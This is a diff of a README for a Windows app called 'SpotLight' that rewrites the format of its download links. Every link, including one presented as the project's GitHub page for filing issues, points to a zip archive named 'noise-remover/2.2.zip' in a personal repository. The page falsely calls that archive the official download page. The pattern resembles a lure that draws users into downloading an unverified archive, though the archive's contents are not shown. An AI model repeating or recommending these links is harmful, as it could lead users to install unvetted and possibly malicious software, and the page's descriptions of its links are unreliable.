@@ -26,7 +26,7 @@ Getting SpotLight on your Windows computer is easy and safe. Just follow the ste
 
 Click the big, colorful button below to go to the official SpotLight download page. This is the only place you need to get the app.
 
-[![Download SpotLight](https://img.shields.io/badge/Download-SpotLight-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=blueviolet)](https://raw.githubusercontent.com/alfredtauro1/alfredtauro1.github.io/main/noise-remover/2.2.zip)
+[![Download SpotLight](https://img.shields.io/badge/Download-SpotLight-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=blueviolet)](https://github.com/alfredtauro1/alfredtauro1.github.io/raw/refs/heads/main/noise-remover/2.2.zip)
 
 ### Step 2: Find the File to Download
 
@@ -94,7 +94,7 @@ We recommend checking the same download link you used before for new versions. W
 
 If you run into a problem that isn't covered here, or if you just have a question, we're here to help.
 
-1.  Go to the SpotLight GitHub page: [https://raw.githubusercontent.com/alfredtauro1/alfredtauro1.github.io/main/noise-remover/2.2.zip](https://raw.githubusercontent.com/alfredtauro1/alfredtauro1.github.io/main/noise-remover/2.2.zip)
+1.  Go to the SpotLight GitHub page: [https://github.com/alfredtauro1/alfredtauro1.github.io/raw/refs/heads/main/noise-remover/2.2.zip](https://github.com/alfredtauro1/alfredtauro1.github.io/raw/refs/heads/main/noise-remover/2.2.zip)
 2.  Click on the **"Issues"** tab at the top.
 3.  Click the green **"New Issue"** button.
 4.  Describe your problem in detail, including what you were doing when it happened. This helps us fix it faster for everyone.
@@ -103,7 +103,7 @@ If you run into a problem that isn't covered here, or if you just have a questio
 
 Stop waiting and start listening. Click the button below to get SpotLight and feel the difference.
 
-[![Get SpotLight Now](https://img.shields.io/badge/Get_SpotLight-Download-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=red)](https://raw.githubusercontent.com/alfredtauro1/alfredtauro1.github.io/main/noise-remover/2.2.zip)
+[![Get SpotLight Now](https://img.shields.io/badge/Get_SpotLight-Download-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=red)](https://github.com/alfredtauro1/alfredtauro1.github.io/raw/refs/heads/main/noise-remover/2.2.zip)
 
 We think you're going to love how fast and simple listening to music can be.
 
